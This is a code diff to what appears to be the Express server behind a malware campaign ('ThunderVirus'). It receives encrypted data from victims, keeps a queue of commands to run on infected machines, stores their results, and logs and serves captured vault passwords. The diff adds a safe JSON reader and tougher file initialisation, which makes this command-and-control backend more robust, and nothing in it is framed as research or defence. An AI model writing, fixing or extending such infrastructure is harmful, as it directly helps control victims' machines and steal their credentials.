@@ -11,12 +11,26 @@ const SECRET_KEY = 'ThunderVirus2024SecretKey!';
 const VICTIMS_FILE = path.join(__dirname, 'victims.json');
 const VAULT_FILE = path.join(__dirname, 'vault-passwords.json');
 
-// Initialize files if they don't exist
-if (!fs.existsSync(VICTIMS_FILE)) {
-  fs.writeFileSync(VICTIMS_FILE, '[]', 'utf8');
+// ─── Safe JSON file reader ──────────────────────────────────────────────────
+function safeReadJSON(filePath) {
+  try {
+    const raw = fs.readFileSync(filePath, 'utf8').trim();
+    if (!raw) return [];
+    return JSON.parse(raw);
+  } catch (e) {
+    return [];
+  }
 }
-if (!fs.existsSync(VAULT_FILE)) {
-  fs.writeFileSync(VAULT_FILE, '[]', 'utf8');
+
+// Initialize files if they don't exist or are empty/corrupt
+for (const f of [VICTIMS_FILE, VAULT_FILE]) {
+  try {
+    const raw = fs.existsSync(f) ? fs.readFileSync(f, 'utf8').trim() : '';
+    if (!raw) fs.writeFileSync(f, '[]', 'utf8');
+    else JSON.parse(raw); // validate — throws if corrupt
+  } catch (e) {
+    fs.writeFileSync(f, '[]', 'utf8');
+  }
 }
 
 // Middleware
@@ -35,7 +49,11 @@ const chunkStore = {};
 const commandQueue = []; // Array of { commandId, victimId, action, path, content, status, timestamp }
 const COMMAND_HISTORY_FILE = path.join(__dirname, 'command-history.json');
 
-if (!fs.existsSync(COMMAND_HISTORY_FILE)) {
+try {
+  const raw = fs.existsSync(COMMAND_HISTORY_FILE) ? fs.readFileSync(COMMAND_HISTORY_FILE, 'utf8').trim() : '';
+  if (!raw) fs.writeFileSync(COMMAND_HISTORY_FILE, '[]', 'utf8');
+  else JSON.parse(raw);
+} catch (e) {
   fs.writeFileSync(COMMAND_HISTORY_FILE, '[]', 'utf8');
 }
 
@@ -112,7 +130,7 @@ app.post('/api/command-result', (req, res) => {
 
     // Store in history file
     try {
-      const history = JSON.parse(fs.readFileSync(COMMAND_HISTORY_FILE, 'utf8'));
+      const history = safeReadJSON(COMMAND_HISTORY_FILE);
       history.push({
         commandId,
         victimId,
@@ -140,7 +158,7 @@ app.post('/api/command-result', (req, res) => {
 app.get('/api/command-history', (req, res) => {
   try {
     // Combine queue (in-memory) with stored history
-    const history = JSON.parse(fs.readFileSync(COMMAND_HISTORY_FILE, 'utf8'));
+    const history = safeReadJSON(COMMAND_HISTORY_FILE);
     res.json({ queue: commandQueue, history });
   } catch (err) {
     res.json({ queue: commandQueue, history: [] });
@@ -184,7 +202,7 @@ app.post('/api/collect', (req, res) => {
         const victimData = JSON.parse(decrypted);
 
         // Read existing victims
-        const victims = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
+        const victims = safeReadJSON(VICTIMS_FILE);
         victims.push({
           victimId,
           ip: chunkStore[victimId].ip,
@@ -212,8 +230,8 @@ app.post('/api/collect', (req, res) => {
 // ─── GET /api/victims ───────────────────────────────────────────────────────
 app.get('/api/victims', (req, res) => {
   try {
-    const victims = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
-    const vaultPasswords = JSON.parse(fs.readFileSync(VAULT_FILE, 'utf8'));
+    const victims = safeReadJSON(VICTIMS_FILE);
+    const vaultPasswords = safeReadJSON(VAULT_FILE);
     res.json({ victims, vaultPasswords });
   } catch (err) {
     res.json({ victims: [], vaultPasswords: [] });
@@ -223,7 +241,7 @@ app.get('/api/victims', (req, res) => {
 // ─── GET /api/stats ─────────────────────────────────────────────────────────
 app.get('/api/stats', (req, res) => {
   try {
-    const victims = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
+    const victims = safeReadJSON(VICTIMS_FILE);
     res.json({
       totalVictims: victims.length,
       lastSeen: victims.length > 0 ? victims[victims.length - 1].timestamp : null,
@@ -237,7 +255,7 @@ app.get('/api/stats', (req, res) => {
 app.post('/api/vault-password', (req, res) => {
   try {
     const { victimId, password, folder, fileCount, timestamp } = req.body;
-    const passwords = JSON.parse(fs.readFileSync(VAULT_FILE, 'utf8'));
+    const passwords = safeReadJSON(VAULT_FILE);
     passwords.push({ victimId, password, folder, fileCount, timestamp });
     fs.writeFileSync(VAULT_FILE, JSON.stringify(passwords, null, 2), 'utf8');
     console.log(`[VAULT] 🔑 Password captured from ${victimId}: ${password}`);
